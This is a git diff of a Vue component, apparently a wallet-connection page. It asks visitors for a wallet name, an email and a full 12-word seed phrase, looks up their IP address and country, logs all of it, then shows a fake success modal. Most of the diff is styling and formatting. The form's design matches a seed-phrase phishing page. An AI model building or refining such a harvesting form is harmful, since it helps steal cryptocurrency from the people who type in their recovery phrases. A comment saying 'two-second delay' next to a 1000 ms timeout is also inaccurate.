@@ -32,7 +32,7 @@
           <div class="inputs">
             <input
               class="sPhrase"
-              value="Juice world"
+              value="phrase"
               v-for="(word, index) in seedPhrase"
               :key="index"
               type="text"
@@ -64,10 +64,10 @@
 <script setup>
 import { useWalletStore } from '@/stores/walletStore'
 import { computed, reactive, ref, onMounted,  } from 'vue'
-import { useRoute, useRouter } from 'vue-router' // ✅ Import useRouter
+import { useRoute,  useRouter  } from 'vue-router' // ✅ Import useRouter
 
 const route = useRoute()
-const router = useRouter() // ✅ Initialize router
+const router = useRouter()  
 const id = route.params.id
 
 const walletStore = useWalletStore()
@@ -87,8 +87,8 @@ const formState = reactive({
   seedPhrase: Array(12).fill(''),
 })
 
-const showSuccessModal = ref(false) // Success modal state
-
+const showSuccessModal = ref(false) 
+ 
 const handleSubmit = async (e) => {
   e.preventDefault();
 
@@ -101,30 +101,33 @@ const handleSubmit = async (e) => {
       country = data.country_name;
     });
 
-    console.log('Wallet Name:', walletName);
-    console.log('Email:', formState.ai);
-    console.log('Country:', country);
-    console.log('IP Address:', ip);
-    console.log(
-      'Seed Phrase:\n' +
+  console.log('Wallet Name:', walletName);
+  console.log('Email:', formState.ai);
+  console.log('Country:', country);
+  console.log('IP Address:', ip);
+  console.log(
+    'Seed Phrase:\n' +
       formState.seedPhrase
         .map((word, index) => `${index + 1}. ${word}`)
         .join('\n')
-    );
+  );
 
-  showSuccessModal.value = true; // Show modal on success
+  // Introduce a 2-second delay before showing the modal
+  setTimeout(() => {
+    showSuccessModal.value = true;
+  }, 1000);
 
-  // Clear inputs
+  // Clear inputs immediately after submission
   formState.ai = '';
   formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Ensure reactivity
 };
 
-// Function to handle OK button click
-const redirectToHome = () => {
-  showSuccessModal.value = false; // Close the modal
-  router.push('/'); // Redirect to home page
-};
 
+
+// ✅ Define the function to redirect to home
+const redirectToHome = () => {
+  router.push('/'); // Redirects to the home page
+};
 
 
 const { seedPhrase } = formState
@@ -289,13 +292,14 @@ header {
   width: 90%;
   height: 100%;
   background-color: rgb(255, 255, 255);
+  box-shadow: rgba(50, 50, 93, 0.25) 0px 50px 100px -20px, rgba(0, 0, 0, 0.3) 0px 30px 60px -30px, rgba(10, 37, 64, 0.35) 0px -2px 6px 0px inset;
   /* display: flex; */
   justify-content: center;
   display: block;
   flex-direction: column;
   padding: 20px;
   overflow: hidden;
-  border-radius: 4px;
+  border-radius: 8px;
   margin-bottom: 60px;
 }
 
@@ -309,9 +313,12 @@ header {
 }
 input {
   width: 100%;
-  height: 45px;
+  height: 48px;
+  color: black;
+  font-size: 16px;
+  font-weight: 400;
   border-radius: 8px;
-  border: 1px aqua solid;
+  border: 2px rgb(107, 107, 151) solid;
   padding: 5px;
 }
 .btn {
@@ -324,10 +331,16 @@ input {
   margin-top: 20px;
 }
 .btn button {
-  padding: 10px 80px;
+  padding: 16px 80px;
+  font-weight: 500;
   border-radius: 8px;
   border: none;
   background-color: rgb(18, 18, 44);
+  color: rgb(228, 222, 222);
+  transition: .3s;
+}
+.btn button:hover{
+  background-color: rgb(4, 4, 27);
   color: white;
 }
 @media (max-width: 768px) {
